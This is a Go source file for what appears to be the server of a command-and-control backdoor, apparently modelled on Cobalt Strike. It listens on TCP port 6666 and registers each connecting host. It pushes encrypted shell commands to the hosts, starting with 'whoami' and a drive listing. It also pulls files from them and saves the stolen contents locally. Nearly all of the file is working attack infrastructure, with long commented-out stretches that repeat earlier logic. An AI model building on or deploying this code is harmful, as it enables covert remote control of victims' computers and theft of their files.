package cobalt_tcp

import (
	cobalt_crypto "My-Comment/cobalt.crypto"
	"bufio"
	"bytes"
	"fmt"
	"log"
	"net"
	"os"
	"regexp"
	"runtime"
	"strings"
	"time"
)

var DEBUG bool = false
var OPENIP bool = true //是否只按照ip地址区分客户端
//var ReadOrWrite = "Read"

var Computer = runtime.GOOS //
var MaxConnect = 30         // 定义最大连接数量
var MaxChanSize = 10        //默认每个命令通道的大小
var MaxMagString = 50000    //默认每次接受命令的大小

type HOSTS struct {
	Ip            string
	Chans         chan string
	Time          string
	Living        string
	ChansFileName chan string
	Whoami        string
	Disk          []string
	File          string
	ChansBack2    chan string
}

var IpChanMap = make(map[int]HOSTS, MaxConnect)

func MyListen() (net.Listener, error) {
	return net.Listen("tcp", ":6666")
}
func (hosts *HOSTS) UseCmd() {
	var b string
	reader := bufio.NewReader(os.Stdin) // 确保得到空行

	fmt.Printf("使用quit退出\n")
	if Computer == "windows" {
		fmt.Scanf("%s", &b)
	}

	for {
		fmt.Printf(">")
		a, _ := reader.ReadString('\n')
		if strings.Index(a, "quit") == 0 {
			break
		}
		if DEBUG {
			fmt.Printf("user cmd :%s\n", a)
		}

		hosts.Chans <- "Cmd\r\n" + a
		//b = <-hosts.chansBack
		//fmt.Printf("\n%s", b)
	}
}
func (hosts *HOSTS) SetCmd(string2 string) {
	cmd := "Cmd\r\n" + string2
	hosts.Chans <- cmd
	//backs := <-hosts.chansBack
	fmt.Printf("\n")
	//fmt.Printf("%s", backs)
}

func (_ HOSTS) Listener(listener net.Listener) {

	for {

		conn, err := listener.Accept()
		if err != nil {
			fmt.Println(err)
			return
		}
		// 检测地址是否被保存过
		// 检测该端口是否存在过，如果不存在，就标记并传入通道，反之就创建通道，记录并传入
		ip := conn.RemoteAddr().String()
		if OPENIP {
			reg := regexp.MustCompile(`\d*\.\d*\.\d*\.\d`)
			ip = reg.FindString(ip)
		}
		_, cmd := addip(ip)
		//_ = conn.SetReadDeadline(Time.Time{}.Add(Time.Second * 60))
		//ipchan[i] = *cmd
		go PutMsgs(conn, cmd) //复制传输，所以传输后conn的值改变也无妨
		if DEBUG {
			fmt.Printf("启动传输协程完成")
		}

	}
}

func PutMsgs(conn net.Conn, cmd int) {
	// 用于向客户端发送请求的函数
	regstringCmd := "\\ACmd\\r\\n"
	regCmd := regexp.MustCompile(regstringCmd)
	regstring := "\\ADocument"
	reg := regexp.MustCompile(regstring)
	go GetMsg(conn, cmd) //启动接受消息协程
	if DEBUG {
		fmt.Printf("启动接受协程完成")
	}
	for {
		Sends := ""
		Sends = <-IpChanMap[cmd].Chans
		if DEBUG {
			//fmt.Printf("PUT")
		}

		if regCmd.FindString(Sends) == "Cmd\r\n" {
			//defer conn.Close()
			if DEBUG {
				fmt.Printf("Cmd ： %s\n", Sends)
			}
			b, err1 := cobalt_crypto.EncodeString(Sends)
			if err1 != nil {
				fmt.Printf("cmd加密失败")
				log.Println(err1)
			}
			n1, err := conn.Write([]byte(b)) //写入数据
			if DEBUG {
				fmt.Printf("put num = %d\n", n1)
			}
			if err != nil {
				// 信息发送失败报错位置
				fmt.Printf("发送信息错误2\n")
				log.Println(err)
				if DEBUG {
					fmt.Printf("发送服务协程退出")
				}
				return
			}

			temp := IpChanMap[cmd]
			temp.Time = time.Now().Format("01-02 15:04:05")
			IpChanMap[cmd] = temp
		} else if reg.FindString(Sends) == "Document" {
			if DEBUG {
				fmt.Printf("原文：%s\n", Sends)
			}
			file := Sends[8:]
			if DEBUG {
				fmt.Printf("发送内容：%s\n", file)
			}
			b, err1 := cobalt_crypto.EncodeByte([]byte(file))
			if err1 != nil {
				fmt.Printf("document加密失败")
				log.Println(err1)
			}

			n1, err := conn.Write(b) //写入数据
			if DEBUG {
				fmt.Printf("put num = %d\n", n1)
			}
			if err != nil {
				// 信息发送失败报错位置S
				fmt.Printf("发送信息错误2\n")
				log.Println(err)
				if DEBUG {
					fmt.Printf("发送服务协程退出")
				}
				return
			}

			temp := IpChanMap[cmd]
			temp.Time = time.Now().Format("01-02 15:04:05")
			IpChanMap[cmd] = temp

		} else {
			if DEBUG {
				fmt.Printf("其他指令类型 ： %s\n", Sends)
			}
			b, err1 := cobalt_crypto.EncodeByte([]byte(Sends))
			if err1 != nil {
				fmt.Printf("其他指令加密失败")
				log.Println(err1)
			}

			n1, err2 := conn.Write(b) //写入数据
			if DEBUG {
				fmt.Printf("put num = %d\n", n1)
			}
			if err2 != nil {
				fmt.Printf("写入失败，退出协程")
				log.Println(err2)
				return
			}
		}
	}

}

//func ReadCmd() {
//	ReadOrWrite = "Read"
//}
//func WriteCmd() {
//	ReadOrWrite = "Write"
//}
func addip(ip string) (*HOSTS, int) {
	var host *HOSTS
	i := 1
	lens := len(IpChanMap) + 1
	for i < lens {

		if IpChanMap[i].Ip == ip {
			hostTme := IpChanMap[i]
			host = &hostTme
			return host, i
		}
		i++
	}

	if i == lens {
		Chans := make(chan string, MaxChanSize)
		chansBack := make(chan string, MaxChanSize)
		chansBack2 := make(chan string)
		Chans <- "Cmd\r\nwhoami"
		Chans <- "DocumentDisk\r\n"

		temp_host := HOSTS{
			ip,
			Chans,
			time.Now().Format("01-02 15:04:05"),
			"60s",
			chansBack,
			"",
			make([]string, 1),
			"default",
			chansBack2,
		}
		IpChanMap[i] = temp_host
		//hostTme := ipChanMap[i]
		host = &temp_host
	}

	return host, i

}

func (hosts HOSTS) PrintHost(i int) {
	fmt.Printf("%d\t%s\t%s\t\t%s\t %s\n", i+1, hosts.Ip, hosts.Time,
		time.Now().Format("01-02 15:04:05"), hosts.Living)
}

func GetMsg(conn net.Conn, hosts int) {
	//regstring := "\\ADocument\\r\\n"
	//regAlive := "\\AAlive\\r\\n"
	//regDiskString := "\\ADisk\\r\\n"
	//regjin := regexp.MustCompile("###")
	//regA := regexp.MustCompile(regAlive)
	//reg := regexp.MustCompile(regstring)
	//regDisk := regexp.MustCompile(regDiskString)
	//regs := "#EnD#"
	//regEnd := regexp.MustCompile(regs)
	GetMsgs := make([]byte, MaxMagString*4)
	var Messages []byte
	n, err := conn.Read(GetMsgs)
	if err != nil {
		// 信息发送失败报错位置
		fmt.Printf("接受whoami错误3\n")
		log.Println(err)

	}
	if DEBUG {
		fmt.Printf("打印接受的whoami：%s\n", string(GetMsgs[:n]))

	}
	// 解码位置
	temp1, _ := cobalt_crypto.DecodeToString(GetMsgs[:n])
	strings.Replace(temp1, "\\n", "", -1)
	host1 := IpChanMap[hosts]

	host1.Whoami = temp1
	IpChanMap[hosts] = host1
	//hosts.chansBack <- hosts.Whoami
	if DEBUG {
		fmt.Printf("打印赋值的whoami: %s\n", IpChanMap[hosts].Whoami)
	}
	if DEBUG {
		fmt.Printf("whoami: %s\n", GetMsgs)
	}
	var err2 error
	// 开始信息整合处理
	for {
		n1, _ := conn.Read(GetMsgs)

		//if err1 != nil {
		//	fmt.Printf("循环接受失败\n")
		//	log.Println(err1)
		//}
		if DEBUG {
			fmt.Printf("原始消息：%s\n", GetMsgs[:n1])
		}
		GetMsgs, err2 = cobalt_crypto.DecodeToByte(GetMsgs[:n1])
		if err2 != nil {
			fmt.Printf("循环解码错误\n")
			log.Println(err2)
		}
		if DEBUG {
			fmt.Printf("解密后原始消息：%s\n", GetMsgs)
		}
		Messages = bytes.Join([][]byte{Messages, GetMsgs}, []byte("")) // 连接起来
		if DEBUG {
			fmt.Printf("连接的消息%s\n", Messages)
		}
		for {
			if bytes.Index(Messages, []byte("!@#$^&*()_+")) != -1 {
				//取出切片
				num := bytes.Index(Messages, []byte("!@#$^&*()_+"))
				if DEBUG {
					fmt.Printf("坐标位置%d\n", num)
				}

				putmsg, err3 := cobalt_crypto.DecodeToString(Messages[:num])
				if err3 != nil {
					fmt.Printf("处理信息解密失败\n")
					log.Println(err3)
				}
				putmsgByte := Messages[:num]
				if DEBUG {
					fmt.Printf("被分拣出来的内容\n")
					fmt.Println(putmsg)
				}
				Messages = append(Messages[:0], Messages[num+11:]...)
				if DEBUG {
					fmt.Printf("分拣后的缓存%s\n", Messages)
				}
				//putmsg = putmsg[1:]
				go DealMags(putmsg, hosts, putmsgByte)
				continue
				//把切片传入
			} else {
				if DEBUG {
					fmt.Printf("截断\n")
				}
				break
			}
		}
		//Aim,err3 := Messages.ReadString("!@#$%^&*()_+") //匹配内容
		//if if err3 == io.EOF{

	}

}

//for {
//	//fmt.Printf("GET")
//	n1, err1 := conn.Read(GetMsgs)
//	if err1 != nil {
//		fmt.Printf("接受错误4\n")
//		log.Println(err1)
//		return
//	}
//	//b, err2 := SocketToUtf8(GetMsgs[:n1])
//	b, err2 := cobalt_crypto.DecodeToString(GetMsgs[:n1]) // 解码位置
//	GetMsgs, _ = cobalt_crypto.DecodeToByte(GetMsgs[:n1])
//	//b := string(GetMsgs[:n1])
//	//var err2 error = nil
//	if err2 != nil {
//		fmt.Printf("转换失败：\n")
//		log.Println(err2)
//	}
//
//	if regA.FindString(b) == "Alive\r\n" {
//		if DEBUG {
//			//fmt.Printf("收到心跳包")
//		}
//		temp := IpChanMap[hosts]
//		temp.Time = time.Now().Format("01-02 15:04:05")
//		IpChanMap[hosts] = temp
//	} else if reg.FindString(b) == "Document\r\n" {
//		file := b[10:n1]
//		//data, _ := ioutil.ReadAll(transform.NewReader(bytes.NewReader([]byte(file)), simplifiedchinese.GBK.NewEncoder()))
//
//		filename := <-IpChanMap[hosts].ChansFileName
//
//		if filename == "" {
//			filename = IpChanMap[hosts].File
//		}
//		if DEBUG {
//			fmt.Printf("当前文件名称：%s\n", filename)
//		}
//		i := 1
//		if DEBUG {
//			fmt.Printf("打印文件内容\n")
//			fmt.Println(file)
//		}
//		files, err5 := os.OpenFile(filename, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0664) //二次打开使用
//		write := bufio.NewWriter(files)
//		if err5 != nil {
//			fmt.Println("文件打开失败", err)
//			log.Println(err5)
//		}
//		//defer files.Close()
//		if regEnd.FindString(file) == "#EnD#" { //存在###就停止读取
//			if DEBUG {
//				//fmt.Printf("最后发送的消息是：%s", GetMsgs)
//
//			}
//			if DEBUG {
//				fmt.Printf("第一次就发现#EnD#")
//			}
//			file = strings.Replace(file, "#EnD#", "", -1) //去掉标识符
//			//ioutil.WriteFile(filename, []byte(file), 0664)
//			write.WriteString(file)
//			fmt.Println("文件读取结束")
//			write.Flush()
//			goto END
//		}
//
//		if DEBUG {
//			fmt.Printf("准备接受二次传输\n")
//		}
//		_, err5 = write.WriteString(file)
//		if err5 != nil {
//			fmt.Printf("第%d次写入失败\n", i)
//			log.Println(err5)
//		}
//		for {
//
//			//ioutil.WriteFile(filename, []byte(file), 0664)
//
//			n2, err3 := conn.Read(GetMsgs) //读取
//			var err4 error
//			GetMsgs, err4 = cobalt_crypto.DecodeToByte(GetMsgs[:n2])
//			if err3 != nil {
//				fmt.Println("从socket读取文件失败")
//				log.Println(err3)
//				break
//			}
//			if err4 != nil {
//				fmt.Printf("二次接受文件或解码失败")
//				log.Println(err3)
//			}
//			if regEnd.FindString(string(GetMsgs[:n2])) == "#End#" { //存在###就停止读取
//				fmt.Printf("第%d次终于发现#EnD#\n", i+1)
//				if DEBUG {
//					fmt.Printf("打印该次：\n")
//					fmt.Printf("%s", GetMsgs[:n2])
//				}
//				file2 := string(GetMsgs[:n2])
//				//file2 = strings.Replace(file2, "#EnD#", "", -1)
//
//				write.WriteString(file2)
//				write.Flush()
//				fmt.Println("文件读取结束")
//				break
//			} else {
//				file2 := string(GetMsgs[:n2])
//				write.WriteString(file2)
//				write.Flush()
//				if DEBUG {
//					fmt.Printf("文件继续读取")
//				}
//				if DEBUG {
//					//fmt.Printf("最后发送的消息是：%s", file2)
//					fmt.Printf("文件第%d次写入", i)
//					i++
//				}
//
//			}
//			//files.Close()
//		}
//	END:
//		//write.Flush()
//		fmt.Printf("\n文件保存完成\n")
//		temp := IpChanMap[hosts]
//		temp.Time = time.Now().Format("01-02 15:04:05")
//		IpChanMap[hosts] = temp
//		files.Close()
//	} else if regDisk.FindString(b) == "Disk\r\n" {
//		var disknum int
//		b = strings.Replace(b, "\r\n", " ", -1)
//		if DEBUG {
//			fmt.Printf("替换后：%s\n", b)
//		}
//		n, _ := fmt.Sscanf(b, "Disk %d\n", &disknum)
//		if n != 1 {
//			fmt.Printf("Disk接收失败")
//			if DEBUG {
//				fmt.Printf("n = %d\n", n)
//			}
//			log.Println(err)
//		}
//		temp := IpChanMap[hosts] //确保只增加1次
//		capt := cap(temp.Disk) == 1
//		for i := 1; i <= 10; i++ {
//			if ((disknum >> i) & 1) == 1 {
//				if DEBUG {
//					fmt.Printf("当前盘符cap ：%d 盘符len：%d", cap(temp.Disk), len(temp.Disk))
//				}
//				if capt {
//					if DEBUG {
//						fmt.Printf("成功编辑盘符\n")
//					}
//					temp.Disk = append(temp.Disk, string(65+i))
//				}
//				if DEBUG {
//					fmt.Printf("GET_存在盘符%s:\n", string(65+i))
//				}
//
//			}
//		}
//		temp.Time = time.Now().Format("01-02 15:04:05")
//		IpChanMap[hosts] = temp
//
//	} else {
//		if DEBUG {
//			fmt.Printf("收到消息\n")
//		}
//		if ReadOrWrite == "Write" {
//			//	if DEBUG {
//			//		fmt.Printf("进入Write模式")
//			//	}
//			//
//			//	filename := <-IpChanMap[hosts].ChansFileName //取出文件名
//			//	num := len(filename)
//			//	if DEBUG {
//			//		fmt.Printf("本次接受的指令有%d\n", num)
//			//	}
//			//	filename = <-IpChanMap[hosts].ChansFileName //第一个数据处理
//			//	files, err6 := os.OpenFile(filename, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0664)
//			//	write := bufio.NewWriter(files)
//			//	if err6 != nil {
//			//		fmt.Printf("一键执行打开文件错误")
//			//		log.Println(err6)
//			//	}
//			//	write.WriteString(b[3:]) //写入第一次
//			//	write.Flush()
//			//	for {
//			//		n3, err7 := conn.Read(GetMsgs)
//			//		if err7 != nil {
//			//			// 信息发送失败报错位置
//			//			fmt.Printf("接受whoami错误3\n")
//			//			log.Println(err7)
//			//
//			//		}
//			//		d := string(GetMsgs[:n3])
//			//		if regjin.FindString(d[10:]) == "###" {
//			//			c := string(GetMsgs[:n3])
//			//			write.WriteString(c[:len(c)-3])
//			//			write.Flush()
//			//			break
//			//		}
//			//		write.WriteString(b)
//			//		write.Flush()
//			//
//			//	}
//			//	//write.Flush()
//			//	files.Close()
//			//	for i := 1; i < num; i++ { //后几次数据处理
//			//		filename = <-IpChanMap[hosts].ChansFileName
//			//		files, err6 = os.OpenFile(filename, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0664)
//			//		write = bufio.NewWriter(files)
//			//		if err6 != nil {
//			//			fmt.Printf("一键执行打开文件错误")
//			//			log.Println(err6)
//			//		}
//			//		for {
//			//			n3, err7 := conn.Read(GetMsgs)
//			//			if err7 != nil {
//			//				// 信息发送失败报错位置
//			//				fmt.Printf("接受whoami错误3\n")
//			//				log.Println(err7)
//			//
//			//			}
//			//			b = string(GetMsgs[:n3])
//			//			if regjin.FindString(b[3:]) == "###" {
//			//				c := string(GetMsgs[:n3])
//			//				write.WriteString(c[:len(c)-3])
//			//				write.Flush()
//			//				break
//			//			}
//			//			write.WriteString(b)
//			//			write.Flush()
//			//
//			//		}
//			//		//write.Flush()
//			//		files.Close()
//			//	}
//			//	IpChanMap[hosts].ChansBack2 <- "ok"
//			//if filename == "###" {
//			//	IpChanMap[hosts].ChansBack2 <- "ok"
//			//	if DEBUG {
//			//		fmt.Printf("接收到文件结束符号\n")
//			//	}
//			//	break
//			//}
//			//  打开当前文件
//			//files, err6 := os.OpenFile(filename, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0664)
//			//write := bufio.NewWriter(files)
//			//if err6 != nil {
//			//	fmt.Printf("一键执行打开文件错误")
//			//	log.Println(err6)
//			//}
//			//write.WriteString(b[3:]) //写入第一次
//			//for strings.Index(b[3:], "###") != -1 {
//			//	n3, err7 := conn.Read(GetMsgs)
//			//	if err7 != nil {
//			//		// 信息发送失败报错位置
//			//		fmt.Printf("接受whoami错误3\n")
//			//		log.Println(err7)
//			//
//			//	}
//			//	if strings.Index(b[3:], "###") != -1 {
//			//		c := string(GetMsgs[:n3])
//			//		write.WriteString(c[:len(c)-3])
//			//		write.Flush()
//			//		break
//			//	}
//			//	write.WriteString(string(GetMsgs[:n3]))
//			//	write.Flush()
//			//
//			//}
//			//write.Flush()
//			//files.Close()
//			//循环接受
//			//判断是否完成写入
//			//结束
//			//file := b[3 : len(b)-3]
//			//ioutil.WriteFile(filename, []byte(file), 0664)
//			var allcmd string
//			if strings.Index(b, "!@#$%^&*()") != -1 {
//				allcmd = b
//			} else {
//				allcmd = b
//				for {
//					n3, err3 := conn.Read(GetMsgs)
//					if err3 != nil {
//						fmt.Printf("接受多个参数是失败")
//						log.Println(err3)
//					}
//					if strings.Index(string(GetMsgs[:n3]), "!@#$%^&*()_") != -1 {
//						allcmd += string(GetMsgs[:n3])
//						break
//					} else {
//						allcmd += string(GetMsgs[:n3])
//					}
//				}
//			}
//
//			filename := <-IpChanMap[hosts].ChansFileName //取出命令数量
//			num := len(filename)
//			if DEBUG {
//				fmt.Printf("本次接受的指令有%d\n", num)
//			}
//			regcmd := regexp.MustCompile("###(?s:(.*?))###")
//			result := regcmd.FindAllStringSubmatch(allcmd, -1)
//			for _, text := range result {
//				filename = <-IpChanMap[hosts].ChansFileName //取出文件名
//
//				text1 := strings.Join(text, "")
//				ioutil.WriteFile(filename, []byte(text1), 0664)
//			}
//			IpChanMap[hosts].ChansBack2 <- "ok"
//			//if filename == "###" {
//			//	if DEBUG {
//			//		fmt.Printf("收到###\n")
//			//	}
//			//	IpChanMap[hosts].ChansBack2 <- "ok"
//			//} else {
//			//	ioutil.WriteFile(filename, []byte(b), 0664)
//			//	fmt.Printf("完成%s的写入\n", filename)
//			//}
//
//		} else if ReadOrWrite == "Read" {
//			fmt.Printf("%s", b)
//		} else {
//			fmt.Printf("%s", b)
//			fmt.Printf("写入模式错误\n")
//		}
//
//		if DEBUG {
//			fmt.Printf("当前心跳：%s\n", IpChanMap[hosts].Time)
//		}
//
//		if DEBUG {
//			//fmt.Printf("data 打印完毕")
//		}
//		temp := IpChanMap[hosts]
//		temp.Time = time.Now().Format("01-02 15:04:05")
//		IpChanMap[hosts] = temp
//	}
//
//}
//}

func DealMags(GetMsgs string, hosts int, orgin []byte) {
	regstring := "Document\\r\\n"
	regAlive := "Alive\\r\\n"
	regDiskString := "Disk\\r\\n"
	//regs := "#EnD#"
	//regEnd := regexp.MustCompile(regs)
	//regjin := regexp.MustCompile("###")
	regA := regexp.MustCompile(regAlive)
	reg := regexp.MustCompile(regstring)
	regDisk := regexp.MustCompile(regDiskString)
	//GetMsgs = GetMsgs[1:]
	if DEBUG {
		fmt.Printf("传入内容：%s\n", GetMsgs)
	}
	if regA.FindString(GetMsgs) == "Alive\r\n" {
		if DEBUG {
			fmt.Printf("收到心跳包")
		}
		temp := IpChanMap[hosts]
		temp.Time = time.Now().Format("01-02 15:04:05")
		IpChanMap[hosts] = temp
	} else if reg.FindString(GetMsgs) == "Document\r\n" {
		num := strings.Index(GetMsgs, "Document")
		//reg.ReplaceAllString(GetMsgs, "${1}")
		file := orgin[num+10:]
		//data, _ := ioutil.ReadAll(transform.NewReader(bytes.NewReader([]byte(file)), simplifiedchinese.GBK.NewEncoder()))

		filename := <-IpChanMap[hosts].ChansFileName

		if filename == "" {
			filename = IpChanMap[hosts].File
		}
		if DEBUG {
			fmt.Printf("当前文件名称：%s\n", filename)
		}
		//i := 1
		if DEBUG {
			fmt.Printf("打印文件内容\n")
			fmt.Println(file)
		}
		files, err5 := os.OpenFile(filename, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0664) //二次打开使用
		write := bufio.NewWriter(files)
		if err5 != nil {
			fmt.Println("文件打开失败")
			log.Println(err5)
		}
		write.Write(file)
		write.Flush()
		fmt.Printf("文件保存完成\n")
		files.Close()
		//defer files.Close()
		//if regEnd.FindString(file) == "#EnD#" { //存在###就停止读取
		//	if DEBUG {
		//		//fmt.Printf("最后发送的消息是：%s", GetMsgs)
		//
		//	}
		//	if DEBUG {
		//		fmt.Printf("第一次就发现#EnD#")
		//	}
		//	file = strings.Replace(file, "#EnD#", "", -1) //去掉标识符
		//	//ioutil.WriteFile(filename, []byte(file), 0664)
		//	write.WriteString(file)
		//	fmt.Println("文件读取结束")
		//	write.Flush()
		//	//goto END
		//}

		//if DEBUG {
		//	fmt.Printf("准备接受二次传输\n")
		//}
		//_, err5 = write.WriteString(file)
		//if err5 != nil {
		//	fmt.Printf("第%d次写入失败\n", i)
		//	log.Println(err5)
		//}

		//ioutil.WriteFile(filename, []byte(file), 0664)
		//n2, err3 := conn.Read(GetMsgs) //读取
		//var err4 error
		//GetMsgs, err4 = cobalt_crypto.DecodeToByte(GetMsgs[:n2])
		//if err3 != nil {
		//	fmt.Println("从socket读取文件失败")
		//	log.Println(err3)
		//	break
		////}
		//if err4 != nil {
		//	fmt.Printf("二次接受文件或解码失败")
		//	log.Println(err3)
		//}
		//if regEnd.FindString(string(GetMsgs[:n2])) == "#End#" { //存在###就停止读取
		//	fmt.Printf("第%d次终于发现#EnD#\n", i+1)
		//	if DEBUG {
		//		fmt.Printf("打印该次：\n")
		//		fmt.Printf("%s", GetMsgs[:n2])
		//	}
		//	file2 := string(GetMsgs[:n2])
		//	//file2 = strings.Replace(file2, "#EnD#", "", -1)
		//
		//	write.WriteString(file2)
		//	write.Flush()
		//	fmt.Println("文件读取结束")
		//	break
		//} else {
		//	file2 := string(GetMsgs[:n2])
		//	write.WriteString(file2)
		//	write.Flush()
		//	if DEBUG {
		//		fmt.Printf("文件继续读取")
		//	}
		//	if DEBUG {
		//		//fmt.Printf("最后发送的消息是：%s", file2)
		//		fmt.Printf("文件第%d次写入", i)
		//		i++
		//	}
		//
		//}
		//files.Close()

		//END:
		//	//write.Flush()
		//	fmt.Printf("\n文件保存完成\n")
		//	temp := IpChanMap[hosts]
		//	temp.Time = time.Now().Format("01-02 15:04:05")
		//	IpChanMap[hosts] = temp
		//	files.Close()

	} else if regDisk.FindString(GetMsgs) == "Disk\r\n" {
		var disknum int
		//GetMsgs = strings.Replace(GetMsgs, " ", "", 1)
		GetMsgs = GetMsgs[1:]
		GetMsgs = strings.Replace(GetMsgs, "\r\n", " ", -1)
		if DEBUG {
			fmt.Printf("替换后：%s\n", GetMsgs)
		}
		n, _ := fmt.Sscanf(GetMsgs, "Disk %d\n", &disknum)
		if n != 1 {
			fmt.Printf("Disk接收失败")
			if DEBUG {
				fmt.Printf("n = %d\n", n)
			}
			//log.Println(err)
		}
		temp := IpChanMap[hosts] //确保只增加1次
		capt := cap(temp.Disk) == 1
		for i := 1; i <= 10; i++ {
			if ((disknum >> i) & 1) == 1 {
				if DEBUG {
					fmt.Printf("当前盘符cap ：%d 盘符len：%d", cap(temp.Disk), len(temp.Disk))
				}
				if capt {
					if DEBUG {
						fmt.Printf("成功编辑盘符\n")
					}
					temp.Disk = append(temp.Disk, string(65+i))
				}
				if DEBUG {
					fmt.Printf("GET_存在盘符%s:\n", string(65+i))
				}

			}
		}
		temp.Time = time.Now().Format("01-02 15:04:05")
		IpChanMap[hosts] = temp

	} else {
		if DEBUG {
			fmt.Printf("收到消息\n")
		}
		fmt.Printf("%s", GetMsgs)
		//if ReadOrWrite == "Write" {
		//	//	if DEBUG {
		//	//		fmt.Printf("进入Write模式")
		//	//	}
		//	//
		//	//	filename := <-IpChanMap[hosts].ChansFileName //取出文件名
		//	//	num := len(filename)
		//	//	if DEBUG {
		//	//		fmt.Printf("本次接受的指令有%d\n", num)
		//	//	}
		//	//	filename = <-IpChanMap[hosts].ChansFileName //第一个数据处理
		//	//	files, err6 := os.OpenFile(filename, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0664)
		//	//	write := bufio.NewWriter(files)
		//	//	if err6 != nil {
		//	//		fmt.Printf("一键执行打开文件错误")
		//	//		log.Println(err6)
		//	//	}
		//	//	write.WriteString(b[3:]) //写入第一次
		//	//	write.Flush()
		//	//	for {
		//	//		n3, err7 := conn.Read(GetMsgs)
		//	//		if err7 != nil {
		//	//			// 信息发送失败报错位置
		//	//			fmt.Printf("接受whoami错误3\n")
		//	//			log.Println(err7)
		//	//
		//	//		}
		//	//		d := string(GetMsgs[:n3])
		//	//		if regjin.FindString(d[10:]) == "###" {
		//	//			c := string(GetMsgs[:n3])
		//	//			write.WriteString(c[:len(c)-3])
		//	//			write.Flush()
		//	//			break
		//	//		}
		//	//		write.WriteString(b)
		//	//		write.Flush()
		//	//
		//	//	}
		//	//	//write.Flush()
		//	//	files.Close()
		//	//	for i := 1; i < num; i++ { //后几次数据处理
		//	//		filename = <-IpChanMap[hosts].ChansFileName
		//	//		files, err6 = os.OpenFile(filename, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0664)
		//	//		write = bufio.NewWriter(files)
		//	//		if err6 != nil {
		//	//			fmt.Printf("一键执行打开文件错误")
		//	//			log.Println(err6)
		//	//		}
		//	//		for {
		//	//			n3, err7 := conn.Read(GetMsgs)
		//	//			if err7 != nil {
		//	//				// 信息发送失败报错位置
		//	//				fmt.Printf("接受whoami错误3\n")
		//	//				log.Println(err7)
		//	//
		//	//			}
		//	//			b = string(GetMsgs[:n3])
		//	//			if regjin.FindString(b[3:]) == "###" {
		//	//				c := string(GetMsgs[:n3])
		//	//				write.WriteString(c[:len(c)-3])
		//	//				write.Flush()
		//	//				break
		//	//			}
		//	//			write.WriteString(b)
		//	//			write.Flush()
		//	//
		//	//		}
		//	//		//write.Flush()
		//	//		files.Close()
		//	//	}
		//	//	IpChanMap[hosts].ChansBack2 <- "ok"
		//	//if filename == "###" {
		//	//	IpChanMap[hosts].ChansBack2 <- "ok"
		//	//	if DEBUG {
		//	//		fmt.Printf("接收到文件结束符号\n")
		//	//	}
		//	//	break
		//	//}
		//	//  打开当前文件
		//	//files, err6 := os.OpenFile(filename, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0664)
		//	//write := bufio.NewWriter(files)
		//	//if err6 != nil {
		//	//	fmt.Printf("一键执行打开文件错误")
		//	//	log.Println(err6)
		//	//}
		//	//write.WriteString(b[3:]) //写入第一次
		//	//for strings.Index(b[3:], "###") != -1 {
		//	//	n3, err7 := conn.Read(GetMsgs)
		//	//	if err7 != nil {
		//	//		// 信息发送失败报错位置
		//	//		fmt.Printf("接受whoami错误3\n")
		//	//		log.Println(err7)
		//	//
		//	//	}
		//	//	if strings.Index(b[3:], "###") != -1 {
		//	//		c := string(GetMsgs[:n3])
		//	//		write.WriteString(c[:len(c)-3])
		//	//		write.Flush()
		//	//		break
		//	//	}
		//	//	write.WriteString(string(GetMsgs[:n3]))
		//	//	write.Flush()
		//	//
		//	//}
		//	//write.Flush()
		//	//files.Close()
		//	//循环接受
		//	//判断是否完成写入
		//	//结束
		//	//file := b[3 : len(b)-3]
		//	//ioutil.WriteFile(filename, []byte(file), 0664)
		//	var allcmd = GetMsgs
		//	//if strings.Index(GetMsgs, "!@#$%^&*()") != -1 {
		//	//	allcmd = GetMsgs
		//	//} else {
		//	//	allcmd = GetMsgs
		//	//	for {
		//	//		n3, err3 := conn.Read(GetMsgs)
		//	//		if err3 != nil {
		//	//			fmt.Printf("接受多个参数是失败")
		//	//			log.Println(err3)
		//	//		}
		//	//		if strings.Index(string(GetMsgs[:n3]), "!@#$%^&*()_") != -1 {
		//	//			allcmd += string(GetMsgs[:n3])
		//	//			break
		//	//		} else {
		//	//			allcmd += string(GetMsgs[:n3])
		//	//		}
		//	//	}
		//	//}
		//
		//	filename := <-IpChanMap[hosts].ChansFileName //取出命令数量
		//	num := len(filename)
		//	if DEBUG {
		//		fmt.Printf("本次接受的指令有%d\n", num)
		//	}
		//	regcmd := regexp.MustCompile("###(?s:(.*?))###")
		//	result := regcmd.FindAllStringSubmatch(allcmd, -1)
		//	for _, text := range result {
		//		filename = <-IpChanMap[hosts].ChansFileName //取出文件名
		//
		//		text1 := strings.Join(text, "")
		//		ioutil.WriteFile(filename, []byte(text1), 0664)
		//	}
		//	IpChanMap[hosts].ChansBack2 <- "ok"
		//	//if filename == "###" {
		//	//	if DEBUG {
		//	//		fmt.Printf("收到###\n")
		//	//	}
		//	//	IpChanMap[hosts].ChansBack2 <- "ok"
		//	//} else {
		//	//	ioutil.WriteFile(filename, []byte(b), 0664)
		//	//	fmt.Printf("完成%s的写入\n", filename)
		//	//}
		//
		//} else if ReadOrWrite == "Read" {
		//	fmt.Printf("%s", GetMsgs)
		//} else {
		//	fmt.Printf("%s", GetMsgs)
		//	fmt.Printf("写入模式错误\n")
		//}

		if DEBUG {
			fmt.Printf("当前心跳：%s\n", IpChanMap[hosts].Time)
		}

		if DEBUG {
			//fmt.Printf("data 打印完毕")
		}
		temp := IpChanMap[hosts]
		temp.Time = time.Now().Format("01-02 15:04:05")
		IpChanMap[hosts] = temp
	}

}
